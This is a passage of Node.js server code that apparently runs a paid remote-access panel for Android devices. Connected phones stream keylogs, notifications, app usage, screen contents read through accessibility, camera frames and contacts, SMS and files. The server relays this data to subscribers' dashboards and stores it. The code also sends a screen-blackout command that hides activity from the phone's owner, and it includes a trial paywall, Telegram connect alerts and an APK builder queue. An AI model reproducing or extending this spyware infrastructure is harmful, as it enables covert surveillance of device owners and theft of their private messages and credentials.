                            log('TCP', `Auto-resumed stream for ${deviceId} after channel reconnect [${autoCommandId}]`);
                        }, 600);
                    }
                }
            } else if (channelType === 'live') {
                // Evict old stale live socket before registering the new one
                const oldLiveId = deviceToLiveTcp.get(deviceId);
                if (oldLiveId && oldLiveId !== clientId) {
                    const stale = tcpClients.get(oldLiveId);
                    if (stale) { stale.destroy(); tcpClients.delete(oldLiveId); }
                }
                deviceToLiveTcp.set(deviceId, clientId);
                log('TCP', `Live channel registered for ${deviceId}`);
            }
        }
        return;
    }

    if (event === 'device:heartbeat') {
        const { deviceId } = data || {};
        if (!deviceId) return;
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now();
        // Update in-memory registry
        const existing = inMemoryDevices.get(deviceId);
        if (existing) inMemoryDevices.set(deviceId, { ...existing, isOnline: true, lastSeen: new Date() });
        // Broadcast to dashboards immediately, then persist async
        broadcastDash('device:heartbeat', { deviceId, timestamp: new Date() });
        R.markDeviceOnline(deviceId).catch(() => {});
        Device.findOneAndUpdate({ deviceId }, { lastSeen: new Date(), isOnline: true }).catch(() => {});
        return;
    }

    if (event === 'device:pong') {
        const conn = tcpClients.get(clientId);
        if (conn) {
            conn.lastPong = Date.now();
            // Compute true server-side TCP RTT (only for primary channel pongs)
            if (!conn.channelType && conn.deviceId && devicePingTime.has(conn.deviceId)) {
                const rtt = conn.lastPong - devicePingTime.get(conn.deviceId);
                devicePingTime.delete(conn.deviceId);
                broadcastDash('device:latency', { deviceId: conn.deviceId, rtt });
            }
        }
        return;
    }

    // ── Keylog push from Android → relay to dashboards ──────────────
    if (event === 'keylog:entry') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep live channel alive
        const deviceId = conn?.deviceId || data?.deviceId;
        if (deviceId) {
            const entry = { ...data, deviceId, timestamp: data.timestamp || new Date().toISOString() };
            broadcastDash('keylog:push', entry);
            // Persist to Redis (non-blocking)
            R.pushKeylog(deviceId, entry).catch(() => {});
        }
        return;
    }

    // ── Notification push from Android → relay to dashboards ─────────
    if (event === 'notification:entry') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep live channel alive
        const deviceId = conn?.deviceId || data?.deviceId;
        if (deviceId) {
            const entry = { ...data, deviceId };
            // Store in memory per device (last 200)
            if (!global.deviceNotifications) global.deviceNotifications = new Map();
            const list = global.deviceNotifications.get(deviceId) || [];
            list.unshift(entry);
            if (list.length > 200) list.pop();
            global.deviceNotifications.set(deviceId, list);
            // Persist to Redis (non-blocking)
            R.pushNotification(deviceId, entry).catch(() => {});
            broadcastDash('notification:push', entry);
        }
        return;
    }

    // ── Recent app activity from Android → relay to dashboards ───────
    if (event === 'app:foreground') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep live channel alive
        const deviceId = conn?.deviceId || data?.deviceId;
        if (deviceId) {
            const entry = { ...data, deviceId };
            if (!global.deviceActivity) global.deviceActivity = new Map();
            const list = global.deviceActivity.get(deviceId) || [];
            // Dedupe consecutive same-app entries
            if (!list.length || list[0].packageName !== entry.packageName) {
                list.unshift(entry);
                if (list.length > 100) list.pop();
                global.deviceActivity.set(deviceId, list);
                // Persist to Redis (non-blocking)
                R.pushActivity(deviceId, entry).catch(() => {});
                broadcastDash('activity:app_open', entry);
            }
        }
        return;
    }

    // ── Screen reader push from Android → relay to dashboards ────────
    if (event === 'screen:update') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now();
        const deviceId = conn?.deviceId || data?.deviceId;
        if (!deviceId) return;

        let relayData = data;

        // Android compresses the accessibility-tree JSON with GZIP to save 3G bandwidth.
        // Detect the compressed envelope, decompress, then relay the original payload.
        if (data?.compressed === true && typeof data?.data === 'string') {
            try {
                const buf   = Buffer.from(data.data, 'base64');
                const plain = zlib.gunzipSync(buf).toString('utf8');
                relayData   = { ...JSON.parse(plain), deviceId };
            } catch (e) {
                // Decompression failed — drop this frame rather than relay garbage
                return;
            }
        }

        // Cache the latest frame so the dashboard can poll it even if SSE is unreliable
        latestScreenReaderData.set(deviceId, { ...relayData, deviceId, _ts: Date.now() });
        broadcastDash('screen:update', { ...relayData, deviceId });
        return;
    }

    // ── Offline recording notification from Android ──
    // Recordings are stored ONLY on the Android device.
    // Server just notifies the dashboard so it can refresh its list from the device.
    if (event === 'offline_recording:save') {
        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId || data?.deviceId;
        const frameCount = data?.frameCount || 0;
        // Silently drop empty recordings — Android sends these in bulk on reconnect
        if (!deviceId || frameCount === 0) return;
        broadcastDash('offline_recording:saved', {
            deviceId,
            frameCount,
            label: data?.label || '',
        });
        log('TCP', `Recording saved on device ${deviceId} (${frameCount} frames)`);
        return;
    }

    // ── Stream frame from Android ────────────────────────────────────
    if (event === 'stream:frame') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep stream channel alive
        const deviceId = conn?.deviceId;
        if (!deviceId) return;
        const frameData = data?.frameData;
        if (!frameData) return;

        // Throttle: drop frames that arrive faster than FRAME_RELAY_MIN_MS per device.
        // This prevents SSE flooding on slow dashboard connections (e.g. the dashboard
        // on a slow connection can't consume 3 FPS — only relay what it can absorb).
        const now = Date.now();
        const lastRelay = deviceLastFrameMs.get(deviceId) || 0;
        if (now - lastRelay < FRAME_RELAY_MIN_MS) return; // drop this frame
        deviceLastFrameMs.set(deviceId, now);

        // Relay to all dashboard clients — include screen dimensions for coordinate mapping.
        // Always use the server's relay time (now) as the timestamp so the dashboard's
        // staleness check (Date.now() - timestamp) compares server-clock to server-clock
        // instead of device-clock to server-clock (which differ due to timezone / NTP drift).
        const frameMsg = { deviceId, frameData, timestamp: now };
        if (data.screenWidth)  frameMsg.screenWidth  = data.screenWidth;
        if (data.screenHeight) frameMsg.screenHeight = data.screenHeight;

        // Cache the latest JPEG frame so the dashboard can poll it even if SSE is unreliable.
        latestStreamFrame.set(deviceId, { ...frameMsg, _ts: now });

        broadcastDash('stream:frame', frameMsg);
        return;
    }

    // ── Camera frame from Android ─────────────────────────────────────
    if (event === 'camera:frame') {
        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId;
        if (!deviceId) return;
        const frameData = data?.frameData;
        if (!frameData) return;

        const now = Date.now();
        const cameraMsg = {
            deviceId,
            frameData,
            cameraId: data.cameraId || '0',
            timestamp: now,
            _ts: now,
        };
        latestCameraFrame.set(deviceId, cameraMsg);
        broadcastDash('camera:frame', cameraMsg);
        return;
    }

    // ── Command response from Android ───────────────────────────────
    if (event === 'command:response') {
        const { commandId, response: rawResponse, error } = data || {};
        if (!commandId) return;

        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId;

        // Android's sendResponse() JSON-stringifies the response object before putting it
        // into the TCP envelope, so rawResponse arrives as a string, not an object.
        // Parse it here so all downstream code can treat `response` as a plain object.
        let response = rawResponse;
        if (typeof rawResponse === 'string') {
            try { response = JSON.parse(rawResponse); } catch (_) { response = rawResponse; }
        }

        // Push to dashboard SSE IMMEDIATELY — before any DB operations
        const pending = pendingCmds.get(commandId);
        if (pending) {
            clearTimeout(pending.timer);
            pendingCmds.delete(commandId);

            // Pass compressed frame data directly to dashboard — decompression happens client-side.
            // This avoids a costly server-side gunzip + JSON-parse on every recording fetch,
            // keeps SSE event payloads smaller, and lets the dashboard decompress asynchronously
            // without blocking the Node event loop.
            let finalResponse = response;
            if (response && response.framesCompressed === true) {
                log('MSG', `Relaying compressed recording ${response.filename || ''} to dashboard (${
                    typeof response.framesData === 'string' ? response.framesData.length : 0} bytes base64)`);
            }

            const result = { commandId, command: pending.command, deviceId,
                             response: finalResponse, error: error || null, success: !error,
                             timestamp: new Date() };
            // Broadcast to all SSE clients so the result reaches the dashboard even if the
            // SSE connection reconnected (and got a new sseClientId) while the command was in flight.
            // This is safe for single-admin setups; in multi-user setups each client filters by deviceId.
            broadcastDash('command:result', result);

            broadcastDash('activity:log', {
                type: 'command_result', deviceId, command: pending.command,
                commandId, success: !error, timestamp: new Date()
            });
        }

        // Persist to DB fire-and-forget — never block the response pipeline on DB
        Command.findOneAndUpdate(
            { id: commandId },
            { status: error ? 'failed' : 'success', response, error, completedAt: new Date() }
        ).catch(() => {});

        return;
    }

    // ── Task progress pushed by device during offline task execution ───────────
    if (event === 'task:progress') {
        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId;
        broadcastDash('task:progress', { ...data, deviceId });
        return;
    }

    // ── Chunked data stream from Android (contacts, SMS, apps, files…) ─────────
    // The device sends many small "data:chunk" events instead of one huge payload
    // so the dashboard can render data progressively and the 45 s timer is never hit.
    if (event === 'data:chunk') {
        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId;
        if (!deviceId || !data?.commandId) return;
        broadcastDash('data:chunk', { ...data, deviceId });
        return;
    }

    log('MSG', `Unhandled event: ${event}`, 'warn');
}

// ============================================
// TCP SERVER — Android devices (TLS)
// ============================================
const tlsKey  = fs.readFileSync(path.join(__dirname, 'tls', 'server.key'));
const tlsCert = fs.readFileSync(path.join(__dirname, 'tls', 'server.crt'));
const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: false, rejectUnauthorized: false }, (conn) => {
    const id = crypto.randomBytes(8).toString('hex');
    conn.id          = id;
    conn.clientType  = 'android';
    conn.lastPong    = Date.now();
    conn.buf         = '';
    tcpClients.set(id, conn);
    log('TCP', `New Android connection ${id} from ${conn.remoteAddress}`);

    conn.setNoDelay(true);           // disable Nagle — relay commands immediately, don't batch
    conn.setKeepAlive(true, 15000);  // OS-level keepalive: probe after 15 s of silence
    // Increase receive buffer to 256 KB — handles burst data from slow 3G devices
    // (e.g. large keylog dumps or audio data arriving in a single flush)
    conn.setRecvBufferSize && conn.setRecvBufferSize(262144);
    conn.setEncoding('utf8');

    conn.on('data', (chunk) => {
        conn.buf += chunk;
        let idx;
        while ((idx = conn.buf.indexOf('\n')) !== -1) {
            const line = conn.buf.slice(0, idx).trim();
            conn.buf = conn.buf.slice(idx + 1);
            if (!line) continue;
            let msg;
            try { msg = JSON.parse(line); } catch (e) { continue; }
            processMessage(id, 'android', msg.event, msg.data);
        }
    });

    conn.on('close', async () => {
        tcpClients.delete(id);
        if (conn.deviceId) {
            if (conn.channelType === 'stream') {
                // Only remove the stream ref if this socket is still the active one
                if (deviceToStreamTcp.get(conn.deviceId) === id) deviceToStreamTcp.delete(conn.deviceId);
            } else if (conn.channelType === 'live') {
                // Only remove the live ref if this socket is still the active one
                if (deviceToLiveTcp.get(conn.deviceId) === id) deviceToLiveTcp.delete(conn.deviceId);
            } else {
                // Primary channel closed. Only broadcast device:disconnected if this socket
                // is STILL the active primary — a new device:register may have already replaced
                // it (e.g. after our eviction), in which case the device is still online.
                if (deviceToTcp.get(conn.deviceId) !== id) {
                    // Stale socket from previous reconnect — suppress noise
                    return;
                }
                // Grace period: wait 3 s before marking offline, so rapid reconnects (frp tunnel
                // rotation, mobile network handoffs) don't produce false offline flashes in the UI.
                const disconnectedDeviceId = conn.deviceId;
                const disconnectedConnId   = id;
                setTimeout(async () => {
                    // Re-check: if a new primary has registered in the meantime, skip broadcast
                    if (deviceToTcp.get(disconnectedDeviceId) !== disconnectedConnId &&
                        deviceToTcp.has(disconnectedDeviceId)) {
                        return; // Device reconnected during grace period — suppress
                    }
                    log('TCP', `Device ${disconnectedDeviceId} disconnected`);
                    deviceToTcp.delete(disconnectedDeviceId);
                    deviceStreamingState.delete(disconnectedDeviceId);
                    R.markDeviceOffline(disconnectedDeviceId).catch(() => {});
                    try {
                        await Device.findOneAndUpdate({ deviceId: disconnectedDeviceId },
                            { isOnline: false, lastSeen: new Date() });
                    } catch (e) {}
                    {
                        const rec = inMemoryDevices.get(disconnectedDeviceId);
                        const aid = (rec && rec.accessId) || '';
                        broadcastDashScoped('device:disconnected', { deviceId: disconnectedDeviceId, accessId: aid, timestamp: new Date() }, aid || null);
                    }
                    broadcastDeviceList();
                }, 3000);
            }
        }
    });

    conn.on('error', (e) => log('TCP', `Error on ${id}: ${e.message}`, 'error'));
});

tcpServer.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        log('TCP', `Port ${TCP_PORT} in use — killing and retrying…`, 'warn');
        try { require('child_process').execSync(`fuser -k ${TCP_PORT}/tcp 2>/dev/null`); } catch (_) {}
        setTimeout(() => tcpServer.listen(TCP_PORT, '0.0.0.0'), 1500);
    } else {
        log('TCP', `Server error: ${err.message}`, 'error');
    }
});
tcpServer.listen(TCP_PORT, '0.0.0.0', () =>
    log('TCP', `Android device server listening on 0.0.0.0:${TCP_PORT}`));

// ============================================
// HTTP SERVER — Dashboard (SSE + REST, no WebSocket)
// ============================================
const app    = express();
const server = http.createServer(app);

// Compress HTTP responses — reduces dashboard payload sizes significantly on slow connections.
// SSE streams are excluded automatically (streaming responses bypass compression).
app.use(compression({
    level: 6,
    threshold: 1024,
    filter: (req, res) => {
        // Never compress SSE streams — they must flush each event immediately.
        if (req.headers.accept && req.headers.accept.includes('text/event-stream')) return false;
        return compression.filter(req, res);
    }
}));
app.set('trust proxy', 1);
app.use(helmet({
    contentSecurityPolicy: false,           // dashboard inlines styles + uses inline svg captcha
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: 'cross-origin' },
    hsts: process.env.NODE_ENV === 'production' ? undefined : false,
}));
app.use(cors());
app.use(express.json({ limit: '20mb' }));
app.use(express.static(path.join(__dirname, 'public'), {
    maxAge: '1h',           // cache static assets in browser
    etag: true,
    lastModified: true
}));

// Brute-force protection on login + captcha endpoints. Catches scripted
// credential-stuffing while letting normal humans retry several times.
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 30,
    standardHeaders: true,
    legacyHeaders: false,
    message: { success: false, error: 'Too many attempts. Please wait a few minutes and try again.' },
});
const captchaLimiter = rateLimit({
    windowMs: 10 * 60 * 1000,
    max: 60,
    standardHeaders: true,
    legacyHeaders: false,
    message: { success: false, error: 'Too many captcha requests. Please wait and try again.' },
});

// Issue a fresh captcha challenge — used by the login + register pages.
app.get('/api/captcha', captchaLimiter, (req, res) => {
    try {
        const c = createCaptcha();
        res.set('Cache-Control', 'no-store');
        res.json({ success: true, captchaId: c.captchaId, svg: c.svg });
    } catch (e) {
        res.status(500).json({ success: false, error: 'Could not generate captcha.' });
    }
});

app.use('/api/auth', authRoutes);
app.use('/api/user', devicesRoutes);
app.use('/api/user-auth/login', authLimiter);
app.use('/api/user-auth/register', authLimiter);
app.use('/api/user-auth', userAuthRoutes);
app.use('/api/admin/login', authLimiter);

// ── Admin login using ADMIN_USERNAME / ADMIN_PASSWORD secrets ────────────────
app.post('/api/admin/login', (req, res) => {
    const { username, password, captchaId, captcha } = req.body || {};
    if (!verifyCaptcha(captchaId, captcha)) {
        return res.status(400).json({ success: false, error: 'Captcha is incorrect or expired. Please try again.', captchaFailed: true });
    }
    const adminUser = (process.env.ADMIN_USERNAME || '').trim();
    const adminPass = (process.env.ADMIN_PASSWORD || '').trim();
    log('AUTH', `Admin login attempt — user="${username}" configured=${!!adminUser && !!adminPass}`);
    if (!adminUser || !adminPass) {
        log('AUTH', 'ADMIN_USERNAME/ADMIN_PASSWORD not set in environment', 'error');
        return res.status(500).json({ success: false, error: 'Admin credentials not configured on server.' });
    }
    if ((username || '').trim() === adminUser && (password || '').trim() === adminPass) {
        const token = crypto.randomBytes(32).toString('hex');
        if (!global._adminTokens) global._adminTokens = new Map();
        global._adminTokens.set(token, Date.now() + 86400000);
        log('AUTH', `Admin login successful for "${username}"`);
        return res.json({ success: true, token });
    }
    log('AUTH', `Admin login failed — credentials mismatch`, 'warn');
    return res.status(401).json({ success: false, error: 'Invalid credentials.' });
});

// ── Fast dedicated blackout channel ──────────────────────────────────────────
// Bypasses the WebSocket command queue — writes directly to the device TCP socket.
// Dashboard calls this via HTTP for minimum latency (no WS roundtrip, no queue wait).
app.post('/api/device/:deviceId/blackout', (req, res) => {
    const { deviceId } = req.params;
    const { state } = req.body; // true = on, false = off
    const command  = state ? 'screen_blackout_on' : 'screen_blackout_off';
    const tcpConnId = deviceToTcp.get(deviceId);
    const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
    if (!tcpConn || !tcpConn.writable) {
        return res.status(404).json({ success: false, error: 'Device offline or not found' });
    }
    const commandId = crypto.randomBytes(8).toString('hex');
    tcpSend(tcpConn, 'command:execute', { commandId, command, params: null });
    log('BLACKOUT', `Fast channel: ${command} → ${deviceId}`);
    res.json({ success: true, command, deviceId });
});

// ── Admin token verification ──────────────────────────────────────────────────
app.post('/api/admin/verify', (req, res) => {
    const { token } = req.body;
    if (!token) return res.status(401).json({ success: false });
    if (!global._adminTokens) return res.status(401).json({ success: false });
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) {
        global._adminTokens.delete(token);
        return res.status(401).json({ success: false });
    }
    return res.json({ success: true });
});

// ── SSE event stream — Dashboard persistent TCP push channel ─────────────────
// Browser connects here with EventSource; server pushes newline-delimited JSON.
// Each dashboard has an sseId used to route command results back to the right tab.
app.get('/api/events', async (req, res) => {
    const token = req.query.token;
    if (!token) return res.status(401).end();

    // Accept either an admin token (hex from global._adminTokens) OR a user
    // JWT (role: 'user'). For users, look up their accessId so we can scope
    // every device broadcast to their own builds only.
    let role = null;
    let accessId = '';
    let userId = null;
    if (global._adminTokens && global._adminTokens.has(token)) {
        const expiry = global._adminTokens.get(token);
        if (expiry && Date.now() <= expiry) role = 'admin';
    }
    if (!role) {
        try {
            const decoded = jwt.verify(token, getJwtSecret());
            if (decoded && decoded.userId && decoded.role === 'user') {
                role = 'user';
                userId = decoded.userId;
                try {
                    const u = await User.findById(userId).select('accessId').lean();
                    accessId = (u && u.accessId) || '';
                } catch (_) { /* mongo unavailable — accessId stays '' */ }
            }
        } catch (_) { /* invalid token */ }
    }
    if (!role) return res.status(401).end();

    const clientId = crypto.randomBytes(8).toString('hex');

    res.setHeader('Content-Type',  'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection',    'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');  // disable nginx buffering
    res.flushHeaders();

    sseClients.set(clientId, { res, token, role, accessId, userId });
    log('SSE', `Dashboard connected ${clientId} (${role}${accessId ? ' / ' + accessId : ''})`);

    // Immediately push device list + command registry, scoped per role
    const list = await getDeviceList(role === 'user' ? accessId : null);
    sseSend(clientId, 'device:list', list);
    sseSend(clientId, 'commands:registry', COMMANDS);
    // Tell the client its own sseId so it can include it in HTTP requests
    sseSend(clientId, 'session:init', { sseClientId: clientId });

    // Replay buffered data from Redis for all known devices so the dashboard
    // sees everything that happened while it was disconnected / the user was away.
    try {
        const deviceIds = list.map(d => d.deviceId).filter(Boolean);
        for (const did of deviceIds) {
            const [keylogs, notifications, activity] = await Promise.all([
                R.getKeylogs(did),
                R.getNotifications(did),
                R.getActivity(did),
            ]);
            if (keylogs.length)        sseSend(clientId, 'keylog:history',       { deviceId: did, entries: keylogs });
            if (notifications.length)  sseSend(clientId, 'notification:history', { deviceId: did, entries: notifications });
            if (activity.length)       sseSend(clientId, 'activity:history',     { deviceId: did, entries: activity });
        }
    } catch (e) { log('SSE', `History replay error: ${e.message}`, 'warn'); }

    // Keep the connection alive with a comment every 25 s
    const keepAlive = setInterval(() => {
        if (!res.writableEnded) res.write(': ka\n\n');
    }, 25000);

    req.on('close', () => {
        clearInterval(keepAlive);
        sseClients.delete(clientId);
        log('SSE', `Dashboard disconnected ${clientId}`);
        // Do NOT cancel pending commands when SSE disconnects — the dashboard reconnects
        // within 3 s (see useTcpStream.js retry) and results are now broadcast to all
        // SSE clients, so the reconnected tab will still receive the command:result.
        // Only clear the sseId reference so the old (dead) client is no longer targeted.
        for (const [, p] of pendingCmds) {
            if (p.sseId === clientId) p.sseId = null;
        }
    });
});

// ── Dashboard ping — measure server RTT over HTTP/TCP ────────────────────────
app.post('/api/dashboard/ping', (req, res) => {
    res.json({ sentAt: req.body?.sentAt ?? null, serverAt: Date.now() });
});

// ============================================
// SETTINGS API  (Telegram + future settings)
// ============================================
function requireAdmin(req, res, next) {
    const token = (req.headers['authorization'] || '').replace('Bearer ', '') || req.query.token;
    if (!token || !global._adminTokens) return res.status(401).json({ success: false, error: 'Unauthorized' });
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) return res.status(401).json({ success: false, error: 'Unauthorized' });
    next();
}

// Accepts either admin tokens (hex) OR user JWTs. Sets req.authRole = 'admin'|'user'
// and (for users) req.authUserId.
async function requireUserOrAdmin(req, res, next) {
    const token = (req.headers['authorization'] || '').replace('Bearer ', '') || req.query.token;
    if (!token) return res.status(401).json({ success: false, error: 'Unauthorized' });

    // 1) Admin token?
    if (global._adminTokens && global._adminTokens.has(token)) {
        const expiry = global._adminTokens.get(token);
        if (expiry && Date.now() <= expiry) {
            req.authRole = 'admin';
            return next();
        }
    }

    // 2) User JWT?
    try {
        const decoded = jwt.verify(token, getJwtSecret());
        if (decoded && decoded.userId && decoded.role === 'user') {
            req.authRole   = 'user';
            req.authUserId = decoded.userId;
            return next();
        }
    } catch (_) { /* fall through */ }

    return res.status(401).json({ success: false, error: 'Unauthorized' });
}

// After requireUserOrAdmin, ensure the caller is either an admin or a user
// whose 7-day trial / paid window is still active. Returns 402 Payment Required
// (with a structured payload) so the dashboard can render its paywall instead
// of treating it as a generic auth failure.
async function requireActiveSubscription(req, res, next) {
    if (req.authRole === 'admin') return next();
    if (!req.authUserId)         return res.status(401).json({ success: false, error: 'Unauthorized' });
    try {
        const user = await User.findById(req.authUserId).select(
            'tier trialEndDate paidUntil email accessId'
        );
        if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
        if (user.isTrialActive()) {
            req.authUser = user;
            return next();
        }
        return res.status(402).json({
            success: false,
            error:   'subscription_required',
            message: 'Your free trial has ended. Unlock 1 month of access for $25.',
            paywall: {
                priceUsd:   paymentSettings.priceUsd,
                extendDays: paymentSettings.extendDays,
                paymentUrl: buildPaymentUrl(user),
                trialEndDate: user.trialEndDate,
                paidUntil:   user.paidUntil,
            },
        });
    } catch (e) {
        log('AUTH', `requireActiveSubscription error: ${e.message}`, 'error');
        return res.status(500).json({ success: false, error: 'Internal error' });
    }
}

// Compose the final NOWPayments URL with order_id (= our user id) and
// customer_email pre-filled so the IPN webhook can identify the payer.
function buildPaymentUrl(user) {
    const base   = paymentSettings.paymentUrl;
    const sep    = base.includes('?') ? '&' : '?';
    const params = new URLSearchParams();
    if (user && user._id)   params.set('order_id', String(user._id));
    if (user && user.email) params.set('customer_email', user.email);
    const tail = params.toString();
    return tail ? `${base}${sep}${tail}` : base;
}

// GET /api/settings  — return current (sanitised) settings (admin or user)
app.get('/api/settings', requireUserOrAdmin, async (req, res) => {
    if (req.authRole === 'admin') {
        return res.json({
            success: true,
            role: 'admin',
            telegram: {
                botToken:      telegramSettings.botToken ? '***' + telegramSettings.botToken.slice(-6) : '',
                botTokenSet:   !!telegramSettings.botToken,
                chatId:        telegramSettings.chatId,
                enabled:       telegramSettings.enabled,
                notifyConnect: telegramSettings.notifyConnect,
            },
            buildWorker: {
                apiKey:        buildWorkerSettings.apiKey ? '***' + buildWorkerSettings.apiKey.slice(-6) : '',
                apiKeySet:     !!buildWorkerSettings.apiKey,
                workerOnline:  workerOnline(),
                lastSeen:      buildWorkerLastSeen || null,
                pending:       buildJobs.length,
                active:        activeBuildJob ? activeBuildJob.id : null,
            },
        });
    }

    // User: load their personal telegram settings
    try {
        const user = await User.findById(req.authUserId).select(
            'telegramBotToken telegramChatId telegramEnabled telegramNotifyConnect'
        );
        if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
        res.json({
            success: true,
            role: 'user',
            telegram: {
                botToken:      user.telegramBotToken ? '***' + user.telegramBotToken.slice(-6) : '',
                botTokenSet:   !!user.telegramBotToken,
                chatId:        user.telegramChatId || '',
                enabled:       user.telegramEnabled !== false,
                notifyConnect: user.telegramNotifyConnect !== false,
            },
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/settings  — update settings at runtime (admin or user)
app.post('/api/settings', requireUserOrAdmin, async (req, res) => {
    const { telegram } = req.body || {};
    if (!telegram) { return res.json({ success: true }); }

    if (req.authRole === 'admin') {
        if (typeof telegram.botToken      === 'string' && telegram.botToken && !telegram.botToken.startsWith('***'))
            telegramSettings.botToken = telegram.botToken.trim();
        if (typeof telegram.chatId        === 'string')  telegramSettings.chatId        = telegram.chatId.trim();
        if (typeof telegram.enabled       === 'boolean') telegramSettings.enabled       = telegram.enabled;
        if (typeof telegram.notifyConnect === 'boolean') telegramSettings.notifyConnect = telegram.notifyConnect;
        // Admin-only build worker key
        const bw = req.body?.buildWorker;
        if (bw && typeof bw === 'object') {
            if (typeof bw.apiKey === 'string' && bw.apiKey && !bw.apiKey.startsWith('***')) {
                buildWorkerSettings.apiKey = bw.apiKey.trim();
                log('SETTINGS', 'Admin updated build worker API key');
            } else if (bw.apiKey === '') {
                buildWorkerSettings.apiKey = '';
                log('SETTINGS', 'Admin cleared build worker API key');
            }
        }
        log('SETTINGS', 'Admin Telegram settings updated via dashboard');
        return res.json({ success: true });
    }

    // User
    try {
        const user = await User.findById(req.authUserId);
        if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
        if (typeof telegram.botToken      === 'string' && telegram.botToken && !telegram.botToken.startsWith('***'))
            user.telegramBotToken = telegram.botToken.trim();
        if (typeof telegram.chatId        === 'string')  user.telegramChatId        = telegram.chatId.trim();
        if (typeof telegram.enabled       === 'boolean') user.telegramEnabled       = telegram.enabled;
        if (typeof telegram.notifyConnect === 'boolean') user.telegramNotifyConnect = telegram.notifyConnect;
        await user.save();
        log('SETTINGS', `User Telegram settings updated for ${user.email}`);
        return res.json({ success: true });
    } catch (e) {
        return res.status(500).json({ success: false, error: e.message });
    }
});

// POST /api/settings/telegram/test  — send a test message (admin or user)
app.post('/api/settings/telegram/test', requireUserOrAdmin, async (req, res) => {
    const { botToken, chatId } = req.body || {};

    let activeToken, activeChat;
    if (req.authRole === 'admin') {
        activeToken = (botToken && !botToken.startsWith('***')) ? botToken.trim() : telegramSettings.botToken;
        activeChat  = chatId?.trim() || telegramSettings.chatId;
    } else {
        try {
            const user = await User.findById(req.authUserId).select('telegramBotToken telegramChatId');
            if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
            activeToken = (botToken && !botToken.startsWith('***')) ? botToken.trim() : user.telegramBotToken;
            activeChat  = chatId?.trim() || user.telegramChatId;
        } catch (e) {
            return res.status(500).json({ success: false, error: e.message });
        }
    }
    const token = activeToken;
    const chat  = activeChat;
    if (!token || !chat) return res.status(400).json({ success: false, error: 'Bot token and Chat ID are required.' });
    try {
        const https = require('https');
        const body  = JSON.stringify({ chat_id: chat, text: '✅ <b>Test Notification</b>\nYour RemoteAccess dashboard is connected to Telegram!', parse_mode: 'HTML' });
        const opts  = {
            hostname: 'api.telegram.org',
            path:     `/bot${token}/sendMessage`,
            method:   'POST',
            headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
        };
        const result = await new Promise((resolve, reject) => {
            const req2 = https.request(opts, (r) => {
                let data = '';
                r.on('data', d => { data += d; });
                r.on('end', () => { try { resolve(JSON.parse(data)); } catch { resolve({ ok: false }); } });
            });
            req2.on('error', reject);
            req2.write(body);
            req2.end();
        });
        if (result.ok) return res.json({ success: true });
        return res.status(400).json({ success: false, error: result.description || 'Telegram API error' });
    } catch (e) {
        return res.status(500).json({ success: false, error: e.message });
    }
});

// ── Screen reader polling — dashboard polls this when SSE is unreliable ───────
// Returns the latest screen:update frame cached from the Android device.
// Auth via token query param (same pattern as /api/events).
app.get('/api/screen-reader/latest/:deviceId', (req, res) => {
    const token = req.query.token || (req.headers['authorization'] || '').replace('Bearer ', '');
    if (!token || !global._adminTokens) return res.status(401).json({ success: false });
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) return res.status(401).json({ success: false });

    const { deviceId } = req.params;
    const data = latestScreenReaderData.get(deviceId);
    if (!data) return res.json({ success: false, hasData: false });
    res.json(data);
});

// ── Stream frame polling — dashboard polls this when SSE is unreliable ────────
// Returns the latest JPEG stream frame cached from the Android device.
app.get('/api/stream/latest/:deviceId', (req, res) => {
    const token = req.query.token || (req.headers['authorization'] || '').replace('Bearer ', '');
    if (!token || !global._adminTokens) return res.status(401).json({ success: false });
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) return res.status(401).json({ success: false });

    const { deviceId } = req.params;
    const data = latestStreamFrame.get(deviceId);
    if (!data) return res.json({ success: false, hasData: false });
    res.json({ success: true, ...data });
});

// ── Camera frame polling endpoint ──────────────────────────────────────────────
app.get('/api/camera/latest/:deviceId', (req, res) => {
    const token = req.query.token || (req.headers['authorization'] || '').replace('Bearer ', '');
    if (!token || !global._adminTokens) return res.status(401).json({ success: false });
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) return res.status(401).json({ success: false });

    const { deviceId } = req.params;
    const data = latestCameraFrame.get(deviceId);
    if (!data) return res.json({ success: false, hasData: false });
    res.json({ success: true, ...data });
});

// Recordings are stored ONLY on the Android device — no server-side recording endpoints.

// ============================================
// APK BUILDER  (worker-based queue)
// ============================================
// Architecture:
//   1. Users submit jobs via POST /api/build/apk → enqueued in `buildJobs`.
//   2. A standalone build.sh worker (running anywhere) authenticates with
//      buildWorkerSettings.apiKey and long-polls GET /api/build/worker/poll.
//   3. Worker streams log lines back via POST /api/build/worker/log/:id,
//      uploads finished APKs via .../upload/:id/:type, finalises via
//      .../complete/:id.
